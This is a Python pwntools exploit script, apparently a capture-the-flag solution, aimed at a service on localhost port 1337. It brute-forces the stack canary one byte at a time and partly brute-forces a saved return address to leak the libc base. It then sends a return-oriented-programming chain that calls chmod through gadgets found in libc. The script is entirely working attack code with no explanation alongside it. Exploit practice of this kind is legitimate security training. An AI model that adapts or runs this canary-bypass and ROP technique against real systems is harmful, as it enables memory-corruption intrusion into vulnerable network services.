from pwn import *
context(os='linux', arch='amd64')
libc_addr="/lib/x86_64-linux-gnu/libc.so.6"
challenge_addr=0x1E6B
pop_rbp_ret=0x4011BD
leave_ret=0x402178
pop_rdi_ret=0x2133
pop_rdi_ret_in_libc=0x23b6a
pop_rsi_ret_in_libc=0x2601f
puts_got=0x4F60
puts_plt=0x1150

#local_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
file_addr = 0x35c#next(local_libc.search(b"GNU"))
libc_start_main=0x23f90
puts=0x84420
chmod=0x10dd80
system=0x52290
buflen=72
canary=b'\x00'
while len(canary)<8:
    j=0
    while j<256:
        try:
            with remote("localhost",1337,timeout=0.5) as p:
                payload=b'a'*buflen+canary+p8(j)
                p.send(payload)
                if b"stack smashing detected" in p.recvall():
                    j+=1
                    continue
                else:
                    canary+=p8(j)
                    print(canary)
                    break
        except:
            continue
    if j==256:
        print("ERROR!")
        exit(0)
print("Canary is:",hex(u64(canary)))
input()
main_addr=b'\x84'
while len(main_addr)<8:
    j=0
    while j<256:
        if len(main_addr)==1 and  j%16!=1:
            j+=1
            continue
        try:
            with remote("localhost",1337,timeout=0.5) as p:
                payload=b'a'*buflen+canary+b'a'*8+main_addr+p8(j)
                p.send(payload)
                p.recvuntil("Goodbye!\n")
                try:
                    p.recvuntil("GNU C")
                    main_addr+=p8(j)
                    print(main_addr)
                    break
                except:
                    j+=1
                    continue
        except:
            continue
    if j==256:
        print("ERROR!")
        exit(0)

libc_base=u64(main_addr)-0x24184
print("[LEAK]Libc_base is:",hex(libc_base))
while True:
    try:
        p=remote("localhost",1337,timeout=0.5)
        break
    except:
        continue
chmod_addr=chmod+libc_base
payload=b'a'*buflen+canary+b'a'*8+p64(pop_rdi_ret_in_libc+libc_base)+p64(file_addr+libc_base)+p64(pop_rsi_ret_in_libc+libc_base)+p64(4)+p64(chmod_addr)
p.send(payload)
print(p.recvall())
p.interactive()


